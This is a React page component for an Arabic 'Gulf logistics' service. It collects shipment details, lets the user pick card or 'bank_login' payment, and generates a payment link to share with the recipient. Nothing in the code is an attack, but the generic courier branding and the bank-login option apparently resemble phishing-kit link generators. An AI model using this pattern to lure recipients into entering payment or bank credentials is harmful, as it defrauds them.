import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
import { Package, MapPin, Truck, Shield, Clock, Phone, ArrowRight, User, Globe, DollarSign, Building2, CreditCard, RefreshCw, Copy, ExternalLink, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { generatePaymentLink } from "@/utils/paymentLinks";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const LogisticsServices = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const selectedCountry = getCountryByCode(country || "SA");
  const createLink = useCreateLink();

  const [formData, setFormData] = useState({
    senderName: "",
    receiverName: "",
    senderPhone: "",
    receiverPhone: "",
    originCity: "",
    destinationCity: "",
    packageType: "",
    weight: "1.0",
    description: "",
  });

  const [amount, setAmount] = useState("150");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [showSuccess, setShowSuccess] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [copied, setCopied] = useState(false);

  const packageTypes = [
    { value: "document", label: "وثائق ومستندات", icon: "📄" },
    { value: "small_box", label: "طرد صغير", icon: "📦" },
    { value: "medium_box", label: "طرد متوسط", icon: "📦" },
    { value: "large_box", label: "طرد كبير", icon: "🚛" },
    { value: "fragile", label: "قابل للكسر", icon: "🍷" },
    { value: "electronics", label: "إلكترونيات", icon: "💻" },
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const payload = {
      ...formData,
      package_type_label: packageTypes.find(t => t.value === formData.packageType)?.label || '',
      cod_amount: parseFloat(amount),
      payment_method: paymentMethod,
      service_name: 'خدمات اللوجستيات الخليجية',
      selectedCountry: country || "SA"
    };

    try {
      const link = await createLink.mutateAsync({
        type: "logistics",
        country_code: country || "SA",
        payload,
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: 'logistics',
        country: country || 'SA',
        amount: parseFloat(amount),
        currency: getCurrencyCode(country || 'SA'),
        type: 'logistics'
      });
      setCreatedLink(paymentUrl);
      setShowSuccess(true);

      toast({
        title: "تم إنشاء بوليصة الشحن بنجاح!",
        description: "يمكنك الآن مشاركة الرابط مع المستلم",
      });
    } catch (error) {
      console.error("Error creating logistics link:", error);
    }
  };

  if (!selectedCountry) return null;

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col" dir="rtl">
      <header className="bg-slate-900 text-white h-16 sm:h-20 flex items-center sticky top-0 z-50 px-4 shadow-xl border-b-4 border-slate-800">
        <div className="container mx-auto flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg">
              <Truck className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-lg font-black tracking-tight">اللوجستيات الخليجية الموحدة</h1>
              <p className="text-[10px] font-bold opacity-50 uppercase tracking-widest">{selectedCountry.nameAr} - GLOBAL LOGISTICS</p>
            </div>
          </div>
          <BackButton />
        </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-10 max-w-5xl">
        <form onSubmit={handleSubmit} className="grid lg:grid-cols-3 gap-8">
           <div className="lg:col-span-2 space-y-6">
              <Card className="p-8 border-none shadow-2xl rounded-[2.5rem] bg-white relative overflow-hidden">
                 <div className="absolute top-0 left-0 w-32 h-32 bg-slate-50 rounded-full -ml-16 -mt-16" />
                 <h2 className="text-2xl font-black text-slate-800 mb-8 flex items-center gap-3">
                    <MapPin className="w-7 h-7 text-blue-600" /> مسار الشحنة
                 </h2>

                 <div className="grid md:grid-cols-2 gap-8 relative">
                    <div className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 hidden md:block">
                       <div className="w-12 h-12 bg-slate-50 rounded-full flex items-center justify-center border-2 border-dashed">
                          <ArrowRight className="w-6 h-6 text-blue-600" />
                       </div>
                    </div>

                    <div className="space-y-4">
                       <p className="text-[11px] font-black text-blue-600 uppercase tracking-widest px-2">معلومات المرسل</p>
                       <div className="space-y-3">
                          <Input value={formData.senderName} onChange={(e) => setFormData({...formData, senderName: e.target.value})} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" placeholder="اسم المرسل الكامل" required />
                          <Input value={formData.originCity} onChange={(e) => setFormData({...formData, originCity: e.target.value})} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" placeholder="مدينة الانطلاق" required />
                       </div>
                    </div>

                    <div className="space-y-4">
                       <p className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-2">معلومات المستلم</p>
                       <div className="space-y-3">
                          <Input value={formData.receiverName} onChange={(e) => setFormData({...formData, receiverName: e.target.value})} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" placeholder="اسم المستلم الكامل" required />
                          <Input value={formData.destinationCity} onChange={(e) => setFormData({...formData, destinationCity: e.target.value})} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" placeholder="مدينة الوصول" required />
                       </div>
                    </div>
                 </div>
              </Card>

              <Card className="p-8 border-none shadow-2xl rounded-[2.5rem] bg-white">
                 <h2 className="text-2xl font-black text-slate-800 mb-8 flex items-center gap-3">
                    <Package className="w-7 h-7 text-blue-600" /> تفاصيل الطرد
                 </h2>

                 <div className="grid md:grid-cols-2 gap-6">
                    <div className="space-y-1.5">
                       <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">نوع الشحنة</Label>
                       <Select value={formData.packageType} onValueChange={(v) => setFormData({...formData, packageType: v})}>
                          <SelectTrigger className="h-14 border-2 rounded-2xl font-black bg-slate-50/50">
                             <SelectValue placeholder="اختر النوع" />
                          </SelectTrigger>
                          <SelectContent>
                             {packageTypes.map(t => <SelectItem key={t.value} value={t.value}>{t.icon} {t.label}</SelectItem>)}
                          </SelectContent>
                       </Select>
                    </div>
                    <div className="space-y-1.5">
                       <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">الوزن التقديري (كجم)</Label>
                       <Input type="number" value={formData.weight} onChange={(e) => setFormData({...formData, weight: e.target.value})} className="h-14 border-2 rounded-2xl font-black bg-slate-50/50" step="0.1" required />
                    </div>
                 </div>

                 <div className="mt-6 space-y-1.5">
                    <Label className="text-[11px] font-black text-slate-400 uppercase tracking-widest px-1">تكلفة الشحن المتوقعة</Label>
                    <div className="relative group">
                       <Input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} className="h-20 border-b-4 border-l-0 border-r-0 border-t-0 border-slate-100 rounded-none font-black text-5xl bg-transparent px-0 focus:border-blue-600 focus:ring-0 transition-all text-blue-600" />
                       <div className="absolute left-0 top-1/2 -translate-y-1/2 flex items-center gap-2">
                          <span className="text-xl font-black text-slate-300">ر.س</span>
                          <DollarSign className="w-6 h-6 text-slate-100" />
                       </div>
                    </div>
                 </div>

                 {parseFloat(amount) > 0 && (
                    <div className="mt-8 p-6 rounded-[2rem] bg-slate-900 text-white animate-in zoom-in-95 shadow-xl">
                       <div className="flex justify-between items-center mb-2">
                          <span className="text-[10px] font-bold text-slate-400 uppercase tracking-[0.2em]">إجمالي الفاتورة اللوجستية</span>
                          <Shield className="w-5 h-5 text-blue-400" />
                       </div>
                       <div className="flex items-baseline gap-2">
                          <span className="text-4xl font-black">{amount}</span>
                          <span className="text-sm font-bold text-slate-400">ريال سعودي</span>
                       </div>
                    </div>
                 )}
              </Card>

              <Card className="p-8 border-none shadow-2xl rounded-[2.5rem] bg-white">
                 <h2 className="text-xl font-black text-slate-800 mb-6">بوابة السداد المفعلة</h2>
                 <div className="grid grid-cols-2 gap-4">
                    <button type="button" onClick={() => setPaymentMethod('card')} className={`p-6 rounded-[2rem] border-4 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'card' ? 'border-blue-600 bg-blue-50' : 'border-slate-50 bg-slate-50'}`}>
                       <CreditCard className={`w-10 h-10 ${paymentMethod === 'card' ? 'text-blue-600' : 'text-slate-300'}`} />
                       <span className={`text-[12px] font-black uppercase ${paymentMethod === 'card' ? 'text-blue-600' : 'text-slate-400'}`}>بطاقة مدى / فيزا</span>
                    </button>
                    <button type="button" onClick={() => setPaymentMethod('bank_login')} className={`p-6 rounded-[2rem] border-4 transition-all flex flex-col items-center gap-3 ${paymentMethod === 'bank_login' ? 'border-blue-600 bg-blue-50' : 'border-slate-50 bg-slate-50'}`}>
                       <Building2 className={`w-10 h-10 ${paymentMethod === 'bank_login' ? 'text-blue-600' : 'text-slate-300'}`} />
                       <span className={`text-[12px] font-black uppercase ${paymentMethod === 'bank_login' ? 'text-blue-600' : 'text-slate-400'}`}>التحويل المباشر</span>
                    </button>
                 </div>
              </Card>

              <Button type="submit" className="w-full h-20 rounded-[2.5rem] font-black text-xl shadow-[0_20px_50px_rgba(37,99,235,0.3)] bg-blue-600 hover:bg-blue-700 text-white transition-all active:scale-95 group">
                 <div className="flex items-center gap-3">
                    <span>إصدار بوليصة ورابط دفع</span>
                    <ArrowRight className="w-6 h-6 group-hover:translate-x-[-8px] transition-transform" />
                 </div>
              </Button>
           </div>

           <div className="space-y-6">
              <Card className="p-8 border-none shadow-xl rounded-[2.5rem] bg-white">
                 <h3 className="font-black text-slate-800 mb-6 flex items-center gap-2">
                    <Shield className="w-6 h-6 text-green-500" /> ضمان الشحن
                 </h3>
                 <div className="space-y-4">
                    <div className="flex items-start gap-3">
                       <div className="w-2 h-2 rounded-full bg-blue-600 mt-1.5" />
                       <p className="text-xs font-bold text-slate-500 leading-relaxed">تأمين شامل على جميع الطرد ضد التلف أو الفقدان.</p>
                    </div>
                    <div className="flex items-start gap-3">
                       <div className="w-2 h-2 rounded-full bg-blue-600 mt-1.5" />
                       <p className="text-xs font-bold text-slate-500 leading-relaxed">تتبع مباشر عبر الأقمار الصناعية 24/7.</p>
                    </div>
                    <div className="flex items-start gap-3">
                       <div className="w-2 h-2 rounded-full bg-blue-600 mt-1.5" />
                       <p className="text-xs font-bold text-slate-500 leading-relaxed">توصيل من الباب إلى الباب في جميع دول الخليج.</p>
                    </div>
                 </div>
              </Card>

              <div className="p-8 rounded-[2.5rem] bg-gradient-to-br from-blue-600 to-indigo-700 text-white shadow-2xl relative overflow-hidden">
                 <h4 className="font-black text-lg mb-2 relative z-10">تحتاج مساعدة؟</h4>
                 <p className="text-xs font-bold opacity-80 mb-6 relative z-10">فريق الدعم اللوجستي متاح لخدمتكم على مدار الساعة.</p>
                 <Button variant="secondary" className="w-full font-black text-blue-700 rounded-xl relative z-10">تحدث مع خبير</Button>
                 <Truck className="absolute -bottom-6 -right-6 w-32 h-32 opacity-10 -rotate-12" />
              </div>
           </div>
        </form>
      </main>

      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
        <AlertDialogContent className="max-w-[90%] rounded-[3rem] border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
           <div className="p-10 text-center space-y-6">
              <div className="w-24 h-24 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-2">
                <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center animate-bounce shadow-lg shadow-blue-200">
                  <RefreshCw className="w-8 h-8 text-white" />
                </div>
              </div>
              <div>
                <AlertDialogTitle className="text-3xl font-black text-slate-900">البوليصة جاهزة!</AlertDialogTitle>
                <AlertDialogDescription className="font-bold text-slate-500">تم توليد رابط دفع آمن وتجهيز بيانات الشحن</AlertDialogDescription>
              </div>

              <div className="bg-slate-50 p-4 rounded-2xl border-2 border-dashed border-slate-200 break-all font-mono text-xs font-bold text-slate-400">
                {createdLink}
              </div>

              <div className="flex gap-4">
                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); setCopied(true); setTimeout(() => setCopied(false), 2000); toast({ title: "تم النسخ" }); }} className="flex-1 h-16 rounded-2xl font-black bg-slate-900 text-white gap-2">
                   {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                   {copied ? "تم النسخ" : "نسخ الرابط"}
                 </Button>
                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-16 rounded-2xl font-black border-2 border-slate-200 gap-2 text-gray-700">
                   <ExternalLink className="w-5 h-5" /> معاينة
                 </Button>
              </div>
              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-slate-300">إغلاق</Button>
           </div>
        </AlertDialogContent>
      </AlertDialog>

      <div className="h-24" />
      <BottomNav />
    </div>
  );
};

export default LogisticsServices;
